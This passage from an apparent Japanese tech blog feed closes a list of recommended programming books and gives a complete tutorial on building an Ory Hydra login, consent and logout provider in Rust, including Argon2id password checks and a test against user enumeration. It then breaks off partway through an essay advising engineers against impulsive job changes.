ベストプラクティスは「この文脈では有効」という条件付きだが、アンチパターンは「どの文脈でも有害」という普遍性を持つ。だから、何をすべきかより、何をすべきでないかを学ぶ方が、確実に役に立つ。SQLアンチパターン 第2版 ―データベースプログラミングで陥りがちな失敗とその対策作者:Bill Karwinオーム社Amazon4冊目：モダンオペレーティングシステム 第5版（上・下）データベースの次は、さらに下のレイヤーだ。OSの話をする。OSの中身を知りたければ、この本を読め。プロセスとスレッド、メモリ管理、ファイルシステム、入出力、デッドロック、仮想化とクラウド、マルチプロセッサシステム、セキュリティ。OSを構成する要素が、網羅的に解説されている。上下巻合わせて1000ページ超。分厚いが、それだけの価値がある。コンピュータ・サイエンスの分野で世界的な定番となっている教科書だ。21年ぶりに日本語版が復活した。第5版では、Windows 11やSSDなど、最新のトピックまで詳しく解説されている。セキュリティの章は大部分が書き直された。各章末には585題もの演習問題がある。基礎知識の確認から、プログラミングや計算、さまざまな状況への対応まで。問題に取り組むことで、その章で学んだことの理解が深まる。上下巻で1万円を超える。学生には厳しい価格だ。だから言う。図書館で借りろ。大学の図書館には、たいてい置いてある。この本自体がなくても、類書は置いてある。以前、というかかなり昔にマルチスレッドのバグで丸2日を溶かしたことがある。ログを見ても再現しない。デバッガをつけると動く。原因はスレッド間のレースコンディションだった。そのとき、「なぜプロセスとスレッドが分かれているのか」「なぜロックが必要なのか」を、初めて本当に理解した。この本を先に読んでいたら、もう少し早く気づけたかもしれない。この辺はパタヘネ本など他にも良書があるのでそれらでもよい。モダンオペレーティングシステム 第5版 上作者:アンドリュー・S・タネンバウム,ハーバート・ボス日経BPAmazonモダンオペレーティングシステム 第5版 下作者:アンドリュー・S・タネンバウム,ハーバート・ボス日経BPAmazon5冊目：データ指向アプリケーションデザイン ―信頼性、拡張性、保守性の高い分散システム設計の原理OSの次は、分散システムだ。現代のアプリケーションは、1台のサーバーでは動かない。分散システム設計のあらゆるトピックを660ページに渡って網羅する、百科事典のような書籍。バックエンドエンジニアなら、いつかは読むべき本。データベース、レプリケーション、パーティショニング、トランザクション、分散システムの課題、バッチ処理、ストリーム処理。データを扱うシステムを設計する上で知っておくべき知識が、体系的に整理されている。この本の特徴は、何ができるか（WHAT）だけでなく、なぜそうなっているか（WHY）まで説明されていることだ。「なぜレプリケーションが難しいのか」「なぜ書き込み性能が高いマルチリーダーではなくシングルリーダーが広く使われているのか」。そういった「なぜ」を知ることができる。正直、難しい。分散システムに関わっていないと、なかなかピンとこない部分もある。入門として読む本ではない。でも、大規模でデータ量が多いアプリケーションを設計するときには、必ず役に立つ。2026年2月に原著の第2版が出版される予定だ。翻訳版も出てほしい。というか、出てくれ。頼む。この記事を定期的に更新するつもりなので、第2版が出たら差し替える。データ指向アプリケーションデザイン ―信頼性、拡張性、保守性の高い分散システム設計の原理作者:Martin Kleppmann,斉藤太郎,玉川竜司オライリージャパンAmazonプログラマーとしての姿勢を学ぶここまで、技術の土台とシステムの基盤について紹介してきた。ここからは、少し違う話をする。何を学ぶかではなく、どう向き合うかの話だ。技術は日々変わる。でも、変わらないものもある。良いコードを書くための考え方、問題に向き合う姿勢、キャリアを築くためのマインドセット。ここでは、プログラマーとしての「あり方」を教えてくれる本を紹介する。6冊目：達人プログラマー（第2版）熟達に向けたあなたの旅1999年に出版されて以来、世界中のプログラマーに読まれ続けている名著。2019年に20周年記念版として大幅に改訂され、第2版が出た。原題は「The Pragmatic Programmer」。Pragmaticとは、実用本位、実践的という意味だ。理論だけではなく、現場で使える知恵が詰まっている。この本の特徴は、コーディング技法だけでなく、エンジニアとしてのものの見方を教えてくれることだ。DRY原則、ETC原則（Easier To Change）、凝集度と疎結合。そういった技術的な話もあるが、それだけではない。開発の進め方、コミュニケーションの取り方、キャリアの考え方。プログラマーとして生きていくための姿勢が書かれている。「割れた窓」の話は有名だ。悪い設計、誤った意思決定、質の悪いコード。それを放置すると、ネガティブな考えが伝染する。だから、最初の「割れた窓」を見つけたら、すぐに直せ。自分もつい、割れた窓のようなコードを書いてしまったことがある。その後に若いプログラマに保守を任せたとき、いい書き方になっていなかった。元がよくない書き方だから、指摘するのも躊躇してしまう。「石のスープ」の話も印象的だ。大きな変化を一度に起こそうとすると、周囲は萎縮する。だから、小さく始めて、少しずつ巻き込んでいく。未来を少し垣間見せるだけで、みんな集まってくる。読み直すたびに、新しい発見がある。入門者には手引きとなり、ベテランでも読み返すたびに得るものがある。年に1回は読み返し、達人プログラマーを志していきたい。そういう本だ。20年以上読み継がれてきたからこそ、普遍的な価値がある。古い本だから読まなくていい、ということはない。達人プログラマー ―熟達に向けたあなたの旅― 第2版作者:David Thomas,Andrew Huntオーム社Amazon7冊目：プリンシプル オブ プログラミング 3年目までに身につけたい 一生役立つ101の原理原則KISS、DRY、YAGNI、SOLID。プログラミングの世界には、先人たちが積み上げてきた原理原則がある。でも、それらを体系的に学ぶ機会は意外と少ない。現場で「DRYって何？」と聞かれて、ちゃんと説明できるだろうか。この本は、そういった原理原則を101個集めて、1冊にまとめたものだ。「3年目までに身につけたい」という副題がついているが、3年目以降の人が読んでも学びがある。むしろ、色々な現場を経験した人の方が、それぞれの原理原則の含蓄を感じられる。「あのとき、これを知っていれば……」と思うことが、きっとある。この本の特徴は、各項目に「なぜそれが必要か」が明確に説明されていることだ。Howだけでなく、Whyが書かれている。だから、抽象的な情報でありながら、実際に使える知識になる。「How to本」ならぬ「Why本」だ。もう1つの特徴は、各項目に出典書籍と関連書籍が記載されていることだ。「達人プログラマー」「アジャイルソフトウェア開発の奥義」「プログラマが知るべき97のこと」など、名著への参照がちりばめられている。次に読む本を選ぶときの索引としても使える。具体的なコード例がないことを不満に思う人もいるかもしれない。でも、それは意図的だ。言語に依存しないからこそ、どんな言語でプログラミングしていても適用できる。抽象度が高い分、適用範囲は果てしなく広い。本書で「抽象」を押さえたら、「具象」も押さえたい。コードの書き方を扱った本では、『リーダブルコード』（Dustin Boswell、Trevor Foucher著、2012年）が定番として挙げられることが多い。変数名の付け方、コメントの書き方、制御フローの整理。確かに実践的な内容だ。でも、私のおすすめは『ルールズ・オブ・プログラミング』（Chris Zimmerman著、2023年）の方だ。『ルールズ・オブ・プログラミング』は、『Ghost of Tsushima』を開発したSucker Punch Productionsで実際に使われている21のルールをまとめた本だ。「最適化の前に単純化せよ」「コードを制約で囲め」「プログラマーの時間はCPUの時間より貴重」。ゲーム開発という、パフォーマンスと保守性の両方が求められる過酷な現場で磨かれたルールには、説得力がある。syu-m-5151.hatenablog.comもし「リーダブルコードを読め」と勧めてくる人がいたら、「ルールズ・オブ・プログラミングは読みましたか？」と聞いてみてほしい。読んだ上でリーダブルコードを勧めているなら、それは信頼できる。読んでいないなら、まず読んでもらってから、改めて話を聞けばいい。プリンシプル オブ プログラミング 3年目までに身につけたい 一生役立つ101の原理原則作者:上田勲秀和システム新社Amazon技術以外のスキルを身につけるプログラミングができればエンジニアとして成功できる。そう思っていた時期が、私にもあった。でも、現実は違う。あるプロジェクトで、技術的には正しい提案をしたことがある。でも、通らなかった。別のエンジニアの、技術的にはやや劣る提案が採用された。理由は「あいつの方が話しやすい」「あいつの言うことなら安心できる」だった。悔しかった。でも、それが現実だった。技術力だけでは、キャリアは伸びない。なぜか。2つの構造的理由がある。1つは、評価の非対称性だ。あなたの技術力を正しく評価できる人は、組織の中に何人いるか。CTOと数人の先輩エンジニアくらいだろう。でも、あなたのコミュニケーション力は、同僚全員が評価できる。評価が多数決に近い以上、「多くの人に見えるスキル」を持つ人が有利になる。もう1つは、レバレッジの問題だ。自分一人の技術力には限界がある。でも、他者を巻き込む力は、レバレッジが効く。10人を動かせる人は、自分1人で10倍の成果を出す人より、組織では重宝される。これが良いことかどうかは別として、構造としてそうなっている。だから、技術以外のスキルも身につける必要がある。8冊目：SOFT SKILLS ソフトウェア開発者の人生マニュアル 第2版技術書ではない。でも、エンジニアにとって必読の1冊だ。この本のサブタイトルは「ソフトウェア開発者の人生マニュアル」。技術習得法やキャリア構築法だけでなく、セルフマーケティング、生産性、資産形成、フィットネス、マインドセット。人生全般をより良く生きる方法が書かれている。「技術者の地位は技術力の高さではなく、他者の評価で決まってしまう」。これは厳しい現実だ。でも、現実を直視した上で、どうすればいいかを教えてくれる。キャリアをビジネスとして捉え、自分自身をマーケティングする。そういう視点を持つことの重要性が説かれている。正直に言うと、後半の資産形成やフィットネスの章は、ソフトウェア開発者に特化した話題ではない。不動産投資や筋トレの話がかなり詳しく書かれていて、「それ、この本でそこまで書く必要がある？」と思う人もいるだろう。私もそう思った。読む人を選ぶ本、という感想もある。でも、前半のキャリア、セルフマーケティング、学習、生産性の章は、間違いなく読む価値がある。技術力だけでは生き残れない時代に、何を身につけるべきか。その指針を与えてくれる。SOFT SKILLS ソフトウェア開発者の人生マニュアル 第2版作者:ジョン・ソンメズ日経BPAmazon設計とアーキテクチャを深める技術以外のスキルも大事だ。でも、技術を疎かにしていいわけではない。むしろ、技術力があってこそ、それ以外のスキルが活きる。コードが書けるようになったら、次は設計だ。どうやってモジュールを分けるか。どうやってシステム全体を構成するか。設計の良し悪しが、システムの保守性を決める。ここでは、設計とアーキテクチャについて学ぶ本を2冊紹介する。9冊目：アーキテクトの教科書 価値を生むソフトウェアのアーキテクチャ構築「アーキテクトになりたい」「アーキテクトとして成長したい」。そう思ったとき、何から始めればいいのか分からない人は多い。相談できる先輩や上司が身近にいないこともある。この本は、アーキテクティングという世界を探検するにあたっての「地図」となる本だ。アーキテクトの「最初の1冊」として、これ以上のものはない。第2章「ソフトウェア設計」では、V字モデル、4つの抽象（アーキテクチャ設計、モジュール設計、コンポーネント設計、クラス設計）、SOLID原則、設計パターンと、設計を語っていく上での基本概念が密度高く語られる。この章だけでも読んでおけば、設計の話をするときに「何を言っているのか分からない」という状態にはならない。オライリーの『ソフトウェアアーキテクチャの基礎』も良書だが、どこかアカデミックさがあり、ある程度の前提知識が要求される。それに比べて本書は、初学者にも分かりやすく書かれている。ユースケースに沿った解説があるのでおすすめである。第6章「アーキテクトとしての学習と成長」も見逃せない。普段のプロジェクトの中で表立って取り上げられることの少ないテーマだ。「自分がアーキテクトになっていくためにどんな心構えが必要なのか」と悩んでいる人には、とても学びの多い内容になっている。アーキテクトの教科書 価値を生むソフトウェアのアーキテクチャ構築作者:米久保 剛翔泳社Amazon10冊目：ソフトウェア設計の結合バランス 持続可能な成長を支えるモジュール化の原則「疎結合にしろ」「密結合は悪だ」。そういうスローガンは、現場でよく聞く。でも、疎結合とは、具体的にどの程度が「疎」なのか。それを説明できる人は、意外と少ない。この本は、「結合」という概念を徹底的に掘り下げた本だ。本書の主張は明快だ。結合をゼロにすることは不可能であり、むしろ適切な結合を選択することが重要。「疎結合至上主義」ではなく、「結合の均衡化（Balancing Coupling）」という視点を提示している。構造化設計におけるモジュール結合、オブジェクト指向におけるコナーセンス。それらを一通り説明した後、独自の「統合強度」モデルが導入される。強度・距離・変動性の関係性を解き明かし、実際の設計においてそれらをどう均衡化するのかが、具体例を用いて示される。印象的だったのは、結合の「距離」という概念だ。同じ強度の結合でも、それが文レベル、メソッドレベル、オブジェクトレベル、サービスレベルのどこに存在するかによって、変更のコストが大きく異なる。マイクロサービスアーキテクチャの設計において、この視点は特に重要だ。この本は手順書でもルールブックでもない。この本に書かれている通りにモジュール設計をすれば自然とバランスの良い設計になる、という話ではない。でも、方針決定やレビュー時に迷ったとき、この本に書かれているような発想をインプットに意思決定すると、判断の精度が上がる。ソフトウェア設計の結合バランス　持続可能な成長を支えるモジュール化の原則 (impress top gearシリーズ)作者:Vlad KhononovインプレスAmazonおわりに10冊を紹介した。この記事を読んだからといって、明日から何かが変わるわけではない。たぶん来週も、再来週も、同じような日々が続く。10冊すべてを読む必要もない。というか、いきなり10冊読み終わることなんてない。自分も、速読で済ませようとしたことがある。でも、身につかなかった。1冊読んで、合わなければ閉じればいい。それでいい。派手な近道はない。地味な積み重ねだけがある。常に今の自分で戦うしかない。1つだけ、注意しておきたいことがある。誰かを冷笑したり、バカにしたりするのは楽だ。でも、その道に未来はない。他人をバカにしない唯一の方法は、自分が自分の枠の中で精一杯頑張ることだ。精一杯やっている人間は、他人を笑っている暇がない。syu-m-5151.hatenablog.com私も、達人と呼ばれたい者の1人だ。まだ諦めているわけではない。諦めているわけではないが、達人になれるかどうかは分からない。分からないまま、コードを書いている。本を読んでいる。冒頭で、本は問いをくれると書いた。知らなかった世界を見せてくれると書いた。10冊のうち、どれか1冊でも手に取ってもらえたら、と思う。読み終わったとき、新しい問いが生まれているかもしれない。「あ、これが分からなかったのか」。そう思えたら、その本は、あなたにとって正解だったのだと思う。本との出会いは、計画だけでは起きない。本屋に行くと、紹介した本の隣に、もっと自分に合った本が置いてあるかもしれない。図書館で棚を眺めていると、別の本が目に入るかもしれない。そういう出会いは、検索では起きない。AIにも、たぶん見つけられない。だから、本屋に行ってみてもいいかもしれない。図書館に寄ってみてもいいかもしれない。棚の前に立ってみる。それだけでいい。何かが始まるかどうかは、分からない。分からないが、始まるとしたら、たぶんそこからだ。","isoDate":"2026-01-07T01:38:53.000Z","dateMiliSeconds":1767749933000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"RustでOry Hydra用認証プロバイダーを実装する","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/06/004244","contentSnippet":"はじめに年が明けた。月曜日。エディタを開いている。認証プロバイダーを自分で実装できるか、と聞かれたら、たぶん「できる」と答える。OAuth2のRFCは読んだ。フローも理解している、と思う。ただ、「じゃあ書いて」と言われたとき、キーボードに手を置いたまま止まってしまうことがある。頭では分かっている。手が動かない。10年近くインフラやプラットフォームを触ってきた。認可の仕組みは何度も設計した。Kubernetesの認証、サービスメッシュの認可、アクセストークンの検証。それでも「Login Providerをゼロから書け」と言われると、急に自信がなくなる。分かっているはずなのに、分かっていない気がする。知ってるつもり　無知の科学 (ハヤカワ文庫NF)作者:スティーブン スローマン,フィリップ ファーンバック早川書房Amazon知ってるつもり～「問題発見力」を高める「知識システム」の作り方～ (光文社新書)作者:西林 克彦光文社AmazonOry Hydraのドキュメントを開く。Login ProviderとConsent Providerを自分で実装しろ、と書いてある。Node.jsのサンプルがある。Goのサンプルもある。どちらも動く。でも私はRustで書きたかった。年末年始、ぼんやり考えていて気づいたことがある。止まっているのは、技術的に難しいからではない気がする。「何をどの順番で実装すればいいのか」が見えていないのだ。全体像が掴めないまま、最初の一歩が踏み出せずにいる。だからこの記事を書くことにした。過去の自分に向けて。最初の一歩を、順番に。前提知識: この記事は前回の記事の続編です。OAuth2認可コードフローの基礎知識と、Ory Hydraのアーキテクチャ（Login/Consent Providerの役割）を理解している前提で進めます。syu-m-5151.hatenablog.com作るものLogin/Consent Providerとは、Ory Hydraと連携してOAuth2認証フローを処理するWebアプリケーションだ。以下の5つのエンドポイントを実装する。 エンドポイント  役割  GET /login  ログインフォームを表示する  POST /login  認証処理を行い、Hydraに結果を通知する  GET /consent  スコープ承認画面を表示する  POST /consent  承認結果をHydraに通知し、トークン発行へ進む  GET /logout  ログアウト処理を行い、セッションを破棄する 全体の流れOAuth2認可コードフローの中で、Login/Consent Providerがどう動くかを示す。1. ユーザーがクライアントアプリで「ログイン」をクリック2. クライアントがHydraの /oauth2/auth にリダイレクト3. Hydra が Login Provider の GET /login にリダイレクト（login_challenge付き）4. Login Provider がログインフォームを表示5. ユーザーがメール・パスワードを入力して送信6. Login Provider が認証し、Hydra に accept_login を送信7. Hydra が Consent Provider の GET /consent にリダイレクト（consent_challenge付き）8. Consent Provider がスコープ承認画面を表示9. ユーザーが承認10. Consent Provider が Hydra に accept_consent を送信11. Hydra がクライアントにリダイレクト（認可コード付き）12. クライアントが認可コードをトークンに交換Login/Consent Providerが担当するのは3〜10だ。Hydraとの通信には6つのAPIを使う。 API  役割  GET /admin/oauth2/auth/requests/login  login_challengeからリクエスト情報を取得  PUT /admin/oauth2/auth/requests/login/accept  認証成功をHydraに通知  GET /admin/oauth2/auth/requests/consent  consent_challengeからリクエスト情報を取得  PUT /admin/oauth2/auth/requests/consent/accept  承認結果をHydraに通知  GET /admin/oauth2/auth/requests/logout  logout_challengeからリクエスト情報を取得  PUT /admin/oauth2/auth/requests/logout/accept  ログアウトをHydraに通知 www.ory.comLogin HandlerLogin Handlerは2つのエンドポイントで構成される。GET /loginクエリパラメータからlogin_challengeを取得するHydra APIでlogin_challengeを検証し、リクエスト情報を取得するskipフラグが立っていれば（既にセッションがあれば）、フォームを表示せず即座にaccept_loginそうでなければログインフォームを表示するPOST /loginフォームからemail、password、login_challengeを受け取る認証サービスでパスワードを検証する認証成功なら、ユーザー情報をcontextに詰めてaccept_loginを呼ぶHydraが返すリダイレクトURLへ転送するpub async fn login_submit(    State(state): State<AppState>,    Form(form): Form<LoginForm>,) -> Result<Redirect, AppError> {    // 1. 認証処理    let user = state.auth.authenticate(&form.email, &form.password).await?;    // 2. ユーザー情報をcontextに保存（Consent時にDBルックアップ不要）    let user_context = UserContext {        email: user.email.clone(),        role: \\"customer\\".to_string(),        tenant_id: None,    };    // 3. Hydraに認証成功を通知    let completed = state        .hydra        .accept_login(            &form.login_challenge,            &user.id.to_string(),            false,            Some(serde_json::to_value(&user_context)?),        )        .await?;    // 4. Consent画面へリダイレクト    Ok(Redirect::to(&completed.redirect_to))}ポイントはcontextだ。Login時に認証したユーザー情報（email、role、tenant_id）をJSON形式で保存し、Consent Providerへ受け渡す。これにより、Consent処理でDBルックアップが不要になる。Consent HandlerConsent Handlerも2つのエンドポイントで構成される。GET /consentクエリパラメータからconsent_challengeを取得するHydra APIでリクエスト情報（要求されたスコープ、クライアント情報）を取得するskipフラグが立っていれば（既に承認済みなら）、即座にaccept_consentそうでなければスコープ承認画面を表示するPOST /consentフォームからconsent_challengeと承認するスコープを受け取るLogin時に保存したcontextからユーザー情報を取得するIDトークンにカスタムクレーム（email、role、tenant_id）を追加するaccept_consentを呼び、Hydraが返すリダイレクトURLへ転送するIDトークンにクレームを追加することで、クライアントアプリケーションはトークンをデコードするだけでユーザー情報を取得できる。Logout HandlerLogout Handlerは1つのエンドポイントで構成される。Login/Consentと比べてシンプルだ。GET /logoutクエリパラメータからlogout_challengeを取得するHydra APIでaccept_logoutを呼び出すHydraが返すリダイレクトURLへ転送するpub async fn logout_handler(    State(state): State<AppState>,    Query(query): Query<LogoutQuery>,) -> Result<Redirect, AppError> {    let completed = state.hydra.accept_logout(&query.logout_challenge).await?;    Ok(Redirect::to(&completed.redirect_to))}ログアウトフローはLogin/Consentと異なり、確認画面を表示せずに即座にaccept_logoutを呼んでいる。本番環境では「本当にログアウトしますか？」という確認画面を挟むことを検討してもよい。動作確認docker compose up -d./scripts/e2e-test.shIDトークンにemail、role、subが含まれていれば成功だ。ここまでが「何を作るか」「どう動くか」の説明だ。以降は実装の詳細に入る。認証サービスの実装Login Handlerから呼び出される認証サービスの実装に入る。パスワード認証にはOWASPのガイドラインに従い、Argon2idを採用した。cheatsheetseries.owasp.orgArgon2::default()を使っているが、これは意図的だ。argon2クレートのデフォルト値はOWASP推奨設定に準拠している。「専門家が作ったものを信頼する方が合理的」という前回の記事と同じ論理だ。認証部分で見落としがちなのが次の点だ。pub async fn authenticate(&self, email: &str, password: &str) -> Result<User, AppError> {    let users = self.users.read().await;    let user = users.get(email).ok_or(AppError::InvalidCredentials)?;    Argon2::default()        .verify_password(password.as_bytes(), &parsed_hash)        .map_err(|_| AppError::InvalidCredentials)?;    Ok(user.clone())}ユーザーが存在しない場合も、パスワードが間違っている場合も、返すエラーは同じInvalidCredentialsだ。「ユーザーが見つかりません」というエラーを返したくなるが、それは攻撃者に情報を与えてしまう。これはユーザー列挙攻撃（User Enumeration Attack）への対策だ。攻撃者はまず有効なメールアドレスを特定しようとする。エラーメッセージが違えば、登録済みかどうかが分かってしまう。なお、完全な対策にはタイミング攻撃への考慮も必要だ。ユーザーが存在しない場合はArgon2の検証が走らないため、レスポンス時間の差で存在を推測される可能性がある。本番環境では、ユーザー不在時もダミーハッシュを検証することを検討してほしい。owasp.orgテスト設計認証システムのバグは「静かに」起きる。だからテストの考え方も変わる。普通の機能開発では「この操作をしたらこうなる」というテストを書く。でも認証システムでは「この操作をしてもこうならない」というテストの方に価値がある。#[tokio::test]async fn test_login_does_not_reveal_user_existence() {    let service = AuthService::new();    service.register(\\"exists@example.com\\", \\"password\\").await.unwrap();    let err1 = service.authenticate(\\"exists@example.com\\", \\"wrong\\").await.unwrap_err();    let err2 = service.authenticate(\\"nobody@example.com\\", \\"password\\").await.unwrap_err();    assert_eq!(err1.to_string(), err2.to_string());}このテストは「エラーメッセージが同じ」という実装の意図を明示化している。将来誰かが「親切なエラーメッセージにしよう」と思って変更しても、このテストが警告を出す。責任分界点全ての攻撃をアプリケーション層で防ぐ必要はない。何を守り、何をインフラに任せるかを明確にする。ブルートフォース対策: Nginxのrate limitで弾くセッション固定化攻撃: フレームワーク（Axum + tower-sessions）に委譲HTTPS強制: インフラ設定の問題プロジェクト構成今回はAxumを使った。github.comsrc/├── main.rs          # サーバーエントリーポイント├── auth.rs          # 認証サービス├── handlers.rs      # Login/Consent/Logoutハンドラー├── hydra.rs         # Hydra Admin APIクライアント├── models.rs        # Hydra API型定義└── error.rs         # エラー型定義ハンドラー層とサービス層を分離している。認証ロジックはauth.rsに置き、ハンドラーはHTTPリクエストの受け取りとレスポンスの返却だけを担う。フルコードはGitHubリポジトリを参照してほしい。github.com実装チェックリスト必須の実装[ ] Hydra APIクライアント - 6つのAPI呼び出し[ ] GET /login - login_challenge検証、skipフラグ確認、フォーム表示[ ] POST /login - 認証、contextにユーザー情報、accept_login[ ] GET /consent - consent_challenge検証、skipフラグ確認、承認画面表示[ ] POST /consent - context取得、IDトークンにクレーム追加、accept_consent[ ] GET /logout - logout_challenge取得、accept_logout[ ] 認証サービス - Argon2id、ユーザー列挙攻撃対策忘れがちなポイントlogin_challengeとconsent_challengeはhiddenフィールドでフォームに埋め込むskipフラグが立っている場合は画面を表示せず即座にacceptするcontextでLogin→Consent間のユーザー情報受け渡しエラーメッセージはユーザーの存在を漏らさないおわりにこの文章を書き終えて、ターミナルに戻った。docker compose up -dを叩く。コンテナが立ち上がる。E2Eテストを走らせる。グリーン。IDトークンにemailとroleが入っている。動いた。正直に言うと、書いている途中で何度か不安になった。これで説明になっているのか。Login HandlerとConsent Handlerの違いが曖昧になっていないか。contextの使い方は2回書き直した。それでも、動いた。冒頭で書いた「キーボードに手を置いたまま止まってしまう」感覚は、たぶん、また来る。次に認証システムを書くときも、OAuth2のフローを思い出すところから始めるだろう。login_challengeって何だっけ、と調べ直すかもしれない。それでいいのだと思う。認証は「一度理解したら終わり」という領域ではない気がする。毎回、RFCを確認しながら、慎重に実装する。ユーザー列挙攻撃のテストを書いたのも、将来の自分が「親切なエラーメッセージ」を入れようとしたときに止めるためだ。年が明けて、また仕事が始まる。本番の認証システムはOry Hydraに任せる。Login Providerは自分で書く。その境界線が、今の私には見えている気がする。","isoDate":"2026-01-05T15:42:44.000Z","dateMiliSeconds":1767627764000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"おい、辞めるな","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/05/090020","contentSnippet":"はじめにかつての私は、深夜2時にベッドの中で転職サイトを開いていた。開いて、求人を眺めて、閉じて、また開く。そういうことを繰り返していた。辞めたいのか、と聞かれると困った。会社の限界が見えたのか。自分の天井が見えたのか。それとも、隣の芝生の青さに目が眩んでいただけなのか。たぶん、全部だった。たぶん、どれでもなかった。今は、転職を考えていない。これは「今の会社が最高だから」という話ではない。どんな会社にも良い面と悪い面がある。不満がゼロになることはない。ただ、深夜に転職サイトを開く衝動は、いつの間にか消えた。何が変わったのか。環境が変わったのか、自分が変わったのか。たぶん、両方だ。「エンジニアは転職で年収が上がる」「成長できる環境に身を置け」——そんな言葉がタイムラインに流れてくる。転職エージェントからのスカウトメールは週に何通も届く。カジュアル面談のお誘い。年収アップの可能性。もっと刺激的な環境。全部、本当のことだと思う。全部、嘘だとも思う。若いエンジニアが短期的にモノを考えてしまうのは、仕方がない。私もそうだった。目の前の不満が大きく見える。3年後、5年後のことなんて、想像できない。「今すぐ環境を変えたい」という衝動は、若さゆえの特権でもある。その衝動を否定するつもりはない。ただ、かつての自分に言いたいことがある。「おい、ちょっと待て」と。私自身、何度も転職を考えた。「もう限界だ」「ここにいても意味がない」「他の会社ならもっとできるはずだ」——そう思って、転職サイトを眺めた夜は数えきれない。そして、実際に転職したこともある。転職して正解だったケースもあった。「あのタイミングで辞めなくてよかった」と思うケースもあった。だから、この記事で「辞めるな」と書くのは、上から目線のアドバイスではない。かつての自分への手紙だ。あのとき、もう少し踏みとどまっていたらどうなっていたか。もう少し早く辞めていたらどうなっていたか。そういう問いを、今も抱えている。——もし読んでいて上から目線に感じたなら、それは私の力量不足だ。申し訳ない。ある日、気づいたことがある。深夜に転職サイトを開く自分と、翌朝それを後悔する自分は、同じ人間なのに、まったく違うことを考えている。どちらが本当の自分なのか。たぶん、どちらも本当だ。だから困る。この記事は、深夜の衝動と、翌朝の冷静さの、両方に向けて書いている。この記事が、辞めそうな若手に上司から共有されないことを祈っている。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しい。「転職しやすい」という罠ITエンジニアは「転職しやすい職業」だと言われる。確かにそうだ。求人は多い。売り手市場だ。スキルがあれば、転職先を見つけることは比較的容易だろう。だが、「転職しやすい」ことと「キャリアを作れる」ことは、全く別の話だ。私自身、この罠にはまった。転職市場で「引く手あまた」だった時期がある。スカウトメールは毎週届いた。カジュアル面談をすれば、たいてい次のステップに進めた。「自分は市場価値が高い」と思っていた。でも、それは錯覚だった。振り返ると、私は「転職できる」ことと「キャリアを積み上げている」ことを混同していた。転職市場で需要があるのは、単に「エンジニアが足りない」からだ。私個人の価値が高いわけではない。需要と供給のバランスが崩れているだけ。その状況に甘えて、「いつでも転職できる」という安心感に浸っていた。「3年で転職すれば年収が上がる」という話もある。だが、これは単純化しすぎた話だ。実際には、年収が上がる転職もあれば、上がらない転職もある。そして、年収が上がらない転職の方が、実は多い。なぜか。転職には必ずロスが発生するからだ。私が転職したとき、最初の3ヶ月は本当に苦しかった。前職では「あいつに聞けば分かる」と言われていた領域があった。コードベースを熟知していた。誰に何を聞けばいいか知っていた。暗黙のルールも把握していた。転職した瞬間、それが全部ゼロになった。会議で発言しても、「この人、誰？」という空気が流れる。提案しても、文脈を知らないから的外れになる。前職では30分で終わる作業が、3時間かかる。「俺はもっとできるはずなのに」——そう思いながら、毎日を過ごしていた。これが「転職のロス」だ。どんなに経験者であっても、新しい会社のコンテキストをつかむには時間がかかる。前職で積み上げた信頼貯金は、転職した瞬間にリセットされる。私がこの記事で伝えたいのは、現場で働いてきた人間としての実感だ。机上の空論ではなく、実際に転職を経験し、成功も失敗もしてきた中で気づいたことを書く。一見「転職しやすい」ように見えるITエンジニアほど、実は「キャリアを作ること」が難しい——これが私の結論だ。転職のハードルが低いからこそ、安易に転職してしまう。そして、キャリアが積み上がらないまま、年齢だけが積み上がっていく。ただ、ここまで書いてきて、誤解されたくないことがある。「辞めたい」と思うのは、悪いことではない「転職には罠がある」と書いた。でも、それは「辞めたいと思うこと自体が悪い」という意味ではない。ここで1つ、大事なことを言っておきたい。「辞めたい」と思うこと自体は、悪いことではない。むしろ、自然なことだ。どんな会社にも、良い面と悪い面がある。仕事には波がある。うまくいく時期もあれば、何をやってもダメな時期もある。人間関係でストレスを感じることもある。深夜2時に転職サイトを眺める。上司との関係がうまくいかなくて、帰りの電車で「もう嫌だ」と思う。日曜の夜、明日会社に行きたくないと感じる。そういう瞬間は、誰にでもある。私にもあった。今でもある。だから、この記事を読んで「辞めたいと思っている自分はダメだ」とは思わないでほしい。辞めたいと思うことと、実際に辞めることは、別の問題だ。ただ、この分離は言うほど簡単ではない。深夜2時に転職サイトを見ているとき、「これは感情だ、今は判断するな」と冷静に思える人がどれだけいるだろうか。私自身、何度も感情に流されて判断しそうになった。だから、私は自分にルールを課している。1回目で決めるな。深夜のベッドで「辞めたい」と思った。それは1回目だ。まだ決めるな。翌週、上司に理不尽なことを言われて「辞めたい」と思った。まだ決めるな。1ヶ月後、半年後、同じ状況で同じことを思うか。時間をかけて、何度も問い直せ。衝動ではなく、熟慮の末に出した答えなら、それが「辞める」でも「残る」でも、後悔は少ない。要するに、短期ではなく長期で考えろ、ということだ。目の前の感情に振り回されるな。5年後、10年後の自分がどうなっていたいか。そこから逆算して、今の決断を考えろ。正直に言えば、3年程度では何も身についていない。「3年経験があります」と言っても、それは今の環境が整っている状況で、その能力が発揮できる程度だ。上司が調整してくれて、先輩がフォローしてくれて、チームが支えてくれて、ようやく成果が出せている。その支えがなくなった瞬間、同じパフォーマンスが出せるか。出せないなら、それは本当に「能力」と呼べるのか。感情は感情として受け止めていい。ただ、その感情だけで大きな決断をしないでほしい。この記事は、そのための材料を提供したいと思っている。では、冷静に考えるとは、具体的に何を考えればいいのか。次に目指す役割を明確にするまず最初に考えるべきは、「次にどこへ向かいたいのか」だ。エンジニアのキャリアには、いくつかの方向性がある。技術を深める方向——テックリードやスペシャリストだ。特定の領域で「この人に聞けば分かる」と言われる存在になる。アーキテクチャの意思決定を任される。難しい技術的課題を解決する。人を率いる方向——エンジニアリングマネージャー（EM）だ。チームの生産性を最大化する。メンバーの成長を支援する。採用や評価といった組織課題に向き合う。事業に近づく方向——プロダクトマネージャーや、ビジネスサイドとの橋渡し役だ。「何を作るか」を決める側に回る。技術とビジネスの両方を理解し、最適な解を見つける。ここで強調しておきたいのは、IC（Individual 